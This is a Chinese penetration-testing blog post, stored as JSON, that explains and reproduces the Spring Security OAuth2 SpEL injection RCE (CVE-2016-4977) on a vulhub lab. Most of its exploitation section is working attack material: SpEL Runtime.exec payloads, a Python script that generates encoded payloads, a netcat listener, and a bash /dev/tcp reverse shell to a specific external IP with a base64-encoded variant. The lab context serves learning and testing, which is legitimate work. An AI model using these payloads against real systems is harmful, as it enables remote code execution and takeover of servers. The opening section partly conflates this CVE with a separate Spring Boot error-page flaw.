{"title":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","uid":"6567db906d267d45710c8c967afd05c5","slug":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","date":"2021-10-13T12:56:13.931Z","updated":"2021-10-13T12:57:58.643Z","comments":true,"path":"api/articles/Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE.json","keywords":null,"cover":[],"content":"<h1 id=\"一、漏洞原理\"><a href=\"#一、漏洞原理\" class=\"headerlink\" title=\"一、漏洞原理\"></a>一、漏洞原理</h1><ol>\n<li><p>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</p>\n</li>\n<li><p>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</p>\n</li>\n<li><p>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</p>\n</li>\n</ol>\n<h1 id=\"二、利用条件\"><a href=\"#二、利用条件\" class=\"headerlink\" title=\"二、利用条件\"></a>二、利用条件</h1><ul>\n<li><p>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p>\n</li>\n<li><p>至少知道一个触发 springboot 默认错误页面的接口及参数名</p>\n</li>\n</ul>\n<h1 id=\"三、利用方法\"><a href=\"#三、利用方法\" class=\"headerlink\" title=\"三、利用方法\"></a>三、利用方法</h1><h2 id=\"步骤一：找到一个正常传参处\"><a href=\"#步骤一：找到一个正常传参处\" class=\"headerlink\" title=\"步骤一：找到一个正常传参处\"></a>步骤一：找到一个正常传参处</h2><p>比如发现访问  <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p>\n<h2 id=\"步骤二：执行-SpEL-表达式\"><a href=\"#步骤二：执行-SpEL-表达式\" class=\"headerlink\" title=\"步骤二：执行 SpEL 表达式\"></a>步骤二：执行 SpEL 表达式</h2><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\"># coding: utf-8\n\nresult = \"\"\ntarget = 'open -a Calculator'\nfor x in target:\n    result += hex(ord(x)) + \",\"\nprint(result.rstrip(','))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>执行 <code>open -a Calculator</code> 命令</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"漏洞分析：\"><a href=\"#漏洞分析：\" class=\"headerlink\" title=\"漏洞分析：\"></a>漏洞分析：</h2><p>​    <a href=\"https://www.cnblogs.com/litlife/p/10183137.html\">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>\n<h1 id=\"四、漏洞复现\"><a href=\"#四、漏洞复现\" class=\"headerlink\" title=\"四、漏洞复现\"></a>四、漏洞复现</h1><p>这里是用的vulhub，图个方便</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">cd vulhub/spring/CVE-2016-4977/ docker-compose up -d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>启动完成后，访问<code>http://your-ip:8080/</code>即可看到web页面</p>\n<p>访问<code>http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p>\n<p>可见，我们输入是SpEL表达式<code>$&#123;233*233&#125;</code>已经成功执行并返回结果：</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a0f9d36430f8fd97eaa5ccb0622d19429?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDczNDUxNSwiaWF0IjoxNjM0MTI5NzE1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwZjlkMzY0MzBmOGZkOTdlYWE1Y2NiMDYyMmQxOTQyOSJ9.JiBK9h0gsUqh1p3RkLc0CVMNCJYFaMk4FMUgjaQoYs8&download=image.png\"></p>\n<p>然后，我们使用<a href=\"poc.py\">poc.py</a>来生成反弹shell的POC</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">#!/usr/bin/env python\n\nmessage = input('Enter message to encode:')\n\npoc = '$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])\n\nfor ch in message[1:]:\n   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) \n\npoc += ')&#125;'\n\nprint(poc)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>VPS打开监听</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">nc -lnvp 8888<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a2ff2e18b83a66527b4b6d939c24911a4?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDczNDUxNSwiaWF0IjoxNjM0MTI5NzE1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEyZmYyZTE4YjgzYTY2NTI3YjRiNmQ5MzljMjQ5MTFhNCJ9.7xzcoIXvC3_EqbHjmUPN9-0GzCrwqWwYNS4mx0_H9eQ&download=image.png\"></p>\n<p>使用反弹shell命令</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">bash -i >&amp; /dev/tcp/204.44.95.237/8888 0>&amp;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将命令编码得到</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDQuNDQuOTUuMjM3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312abfc6c149b69cceff80fc89eacf7e26d5?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDczNDUxNSwiaWF0IjoxNjM0MTI5NzE1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFiZmM2YzE0OWI2OWNjZWZmODBmYzg5ZWFjZjdlMjZkNSJ9.cmTX_7ixvv8h5_Uaw7DbZ6ROIWddEpbXlP_3fSo4Rds&download=image.png\"></p>\n<p>执行python脚本</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">python poc.py<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将命令添加进去，得到payload</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a7227d7618c89d725b43aec0a2b7906b7?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDczNDUxNSwiaWF0IjoxNjM0MTI5NzE1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE3MjI3ZDc2MThjODlkNzI1YjQzYWVjMGEyYjc5MDZiNyJ9.4bsZnLBMPpPyAxHwQ8dNPWlYsjOfSz-0-PbCobL1ZJA&download=image.png\"></p>\n<p>将得到的payload替换到URL的**${233*233}**位置</p>\n<p>访问该链接，可以看到命令被执行</p>\n<p><img src=\"https://tcs.teambition.net/storage/312afdd3790e84fe2d43d72469c468e39cad?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDczNDUxNSwiaWF0IjoxNjM0MTI5NzE1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFmZGQzNzkwZTg0ZmUyZDQzZDcyNDY5YzQ2OGUzOWNhZCJ9.Ocv4gu-5X5srzRTsBb3TQXuyll0x3syDLUT3OoiQVmw&download=image.png\"></p>\n<p>同时VPS也收到了反弹的shell</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a0543f5668354242893c5179f2dbd889c?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDczNDUxNSwiaWF0IjoxNjM0MTI5NzE1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwNTQzZjU2NjgzNTQyNDI4OTNjNTE3OWYyZGJkODg5YyJ9.S5tQanJyz2l3Q3DxlBdII2efeDuxYSzYn5Fvwd7Pfmg&download=image.png\"></p>\n<h1 id=\"五、参考文章\"><a href=\"#五、参考文章\" class=\"headerlink\" title=\"五、参考文章\"></a>五、参考文章</h1><p><a href=\"https://blog.knownsec.com/2016/10/spring-security-oauth-rce/\"><strong>https://blog.knownsec.com/2016/10/spring-security-oauth-rce/</strong></a></p>\n","feature":true,"text":"一、漏洞原理 spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 $&#123;&#1...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">一、漏洞原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">二、利用条件</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">三、利用方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84\"><span class=\"toc-text\">步骤一：找到一个正常传参处</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E6%89%A7%E8%A1%8C-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F\"><span class=\"toc-text\">步骤二：执行 SpEL 表达式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A\"><span class=\"toc-text\">漏洞分析：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">四、漏洞复现</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">五、参考文章</span></a></li></ol>","author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）","uid":"8177e6fe27c9facc727b78285c09ddd1","slug":"Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）","date":"2021-10-13T12:56:13.935Z","updated":"2021-10-13T12:58:25.082Z","comments":true,"path":"api/articles/Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）.json","keywords":null,"cover":[],"text":"一、漏洞介绍Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。 参考链接：...","link":"","photos":[],"count_time":{"symbolsCount":645,"symbolsTime":"1 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"spring boot信息泄露漏洞","uid":"fe6d0336657ab32bcff127817b4afc45","slug":"spring boot信息泄露漏洞","date":"2021-10-13T12:56:13.929Z","updated":"2021-10-13T12:57:24.344Z","comments":true,"path":"api/articles/spring boot信息泄露漏洞.json","keywords":null,"cover":null,"text":"一、路由地址及接口调用详情泄露 开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等 直接访问以下两个 swagger 相关路由，验证漏洞是否存在： /v2/api-docs /swagger-ui.html 其他...","link":"","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}